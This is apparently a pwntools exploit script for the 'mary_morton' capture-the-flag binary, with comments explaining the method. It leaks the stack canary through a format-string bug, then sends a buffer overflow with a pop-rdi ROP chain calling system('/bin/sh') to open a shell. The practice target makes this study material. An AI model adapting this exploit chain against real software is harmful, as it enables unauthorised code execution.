#!/usr/bin/env python3
from pwn import *
import time, sys, os
'''
The first step for exploiting this binary is to exploit the fmt string vuln to leak the stack canary
this will be important as we need to overwrite the stack canary, and also use a ROP chain to bypass
NX.
THis will be very educational :D

payload = junk + canary + rop + string + system

'''
context.arch = 'amd64'
log.context_level = "DEBUG"

p = process('./mary_morton')

# canary is at offset 23, we know this due to the canary always ending in a null byte
# we can send "%llx." * 30 (long long hex) and begin to search for an address with a null byte
leak = "%23$llx"

# canary leak
def canaryleak(fmt):
	# if someone could help me out with this that would be great
	# this part of the script works, except i dont understand why it hangs sometimes
	# it might just not be getting the right input at the right time??, cuz everytime i leak 
	# the canary manuallly it always works?

    log.info("sometimes the fmt bug does not return anything")
    log.info("if this script hangs, SIGTERM and try again in around 10/30 seconds")
    p.recvuntil("Exit the battle")
    p.sendline("2")
    p.sendline(fmt)
    print(p.recvline(timeout=0.5))
    return int(p.recv(16), 16)


offset = 136
canary = canaryleak(leak)
binsh = p64(0x00400b2b)
#system = p64(0x00400464)
system = p64(0x4006a0)
# pop rdi ; ret
gadget = p64(0x00400ab3)

# we are going to pass /bin/sh as a parameter to system@plt

log.info("Leaked Stack Canary: %s" % hex(canary))
p.recvuntil("Exit")
p.sendline("1")

payload = b"A"*offset
payload += p64(canary)

# junk address to overwrite rbp
payload += p64(0xdeadbeef)

payload += gadget
payload += binsh
payload += system

p.sendline(payload)
p.interactive()
